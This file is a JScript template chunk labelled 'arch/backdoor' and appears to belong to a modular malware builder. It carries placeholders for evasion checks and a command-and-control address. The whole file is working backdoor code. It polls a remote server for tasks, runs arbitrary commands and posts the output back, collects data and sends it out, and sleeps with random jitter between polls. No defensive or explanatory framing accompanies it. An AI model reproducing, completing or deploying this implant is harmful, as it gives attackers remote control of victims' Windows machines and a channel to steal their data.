// chunk: arch/backdoor
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: main
// format: jscript

{{EVASION_CHECKS}}

var _beacon_interval = {{BEACON_INTERVAL}};
var _running = true;

function beacon_loop() {
    while (_running) {
        try {
            var h = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
            h.Open("GET", "http://{{C2_IP}}:{{C2_PORT}}/task", false);
            h.Send();
            if (h.Status === 200) {
                var task = h.ResponseText;
                if (task === "EXIT") {
                    _running = false;
                } else if (task.indexOf("CMD:") === 0) {
                    var result = _run(task.substring(4));
                    var h2 = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
                    h2.Open("POST", "http://{{C2_IP}}:{{C2_PORT}}/result", false);
                    h2.Send(result);
                } else if (task === "COLLECT") {
                    _buf = "";
                    {{COLLECTOR_CALLS}}
                    var h3 = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
                    h3.Open("POST", "http://{{C2_IP}}:{{C2_PORT}}/beacon", false);
                    h3.Send(_buf);
                } else if (task === "NOP") {
                    // idle
                }
            }
        } catch (e) {
            // connection failed, retry after interval
        }
        WScript.Sleep(_beacon_interval + Math.floor(Math.random() * 5000));
    }
}

beacon_loop();
